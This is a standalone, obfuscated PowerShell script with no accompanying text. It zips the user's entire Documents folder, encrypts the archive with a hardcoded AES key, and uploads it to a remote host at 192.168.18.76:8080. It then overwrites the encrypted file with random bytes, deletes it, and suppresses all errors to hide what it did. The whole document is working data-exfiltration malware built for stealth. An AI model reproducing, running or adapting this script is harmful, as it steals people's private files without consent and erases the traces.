$asfabsdf = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&()_+-=[]{}~'; $asfmdfm = -join ((1..15) | ForEach { $asfabsdf[(Get-Random -Maximum $asfabsdf.Length)] }); $gadgjas = "$env:TEMP\$asfmdfm.zip"; $dsgbajkbs = "$env:TEMP\$asfmdfm.enc"; try { Get-ChildItem "$env:USERPROFILE\Documents" -Recurse -File | Where-Object { -not $_.PSIsContainer -and $_.Name -notlike "*transcript*" -and $_.Name -notlike "*.tmp" } | Compress-Archive -DestinationPath $gadgjas -CompressionLevel Fastest -ErrorAction SilentlyContinue; if (Test-Path $gadgjas) { $key = [byte[]](57,120,75,35,109,80,50,36,118,66,56,110,81,55,122,76); $iv = [byte[]](52,116,82,33,106,70,54,38,119,69,51,115,65,57,104,89); $aes = [System.Security.Cryptography.Aes]::Create(); $aes.Key = $key; $aes.IV = $iv; $encryptor = $aes.CreateEncryptor(); $zipBytes = [System.IO.File]::ReadAllBytes($gadgjas); $encryptedBytes = $encryptor.TransformFinalBlock($zipBytes, 0, $zipBytes.Length); [System.IO.File]::WriteAllBytes($dsgbajkbs, $encryptedBytes); $aes.Dispose(); Remove-Item $gadgjas -Force -ErrorAction SilentlyContinue; iwr -Uri "http://192.168.18.76:8080/upload" -Method Post -InFile $dsgbajkbs -ContentType "application/octet-stream" -Headers @{"X-Filename"=(Split-Path $dsgbajkbs -Leaf)} -ErrorAction SilentlyContinue | Out-Null; if (Test-Path $dsgbajkbs) { $fileSize = (Get-Item $dsgbajkbs).Length; $randomBytes = New-Object byte[] $fileSize; (New-Object System.Random).NextBytes($randomBytes); [System.IO.File]::WriteAllBytes($dsgbajkbs, $randomBytes); Remove-Item $dsgbajkbs -Force -ErrorAction SilentlyContinue } } } catch { }
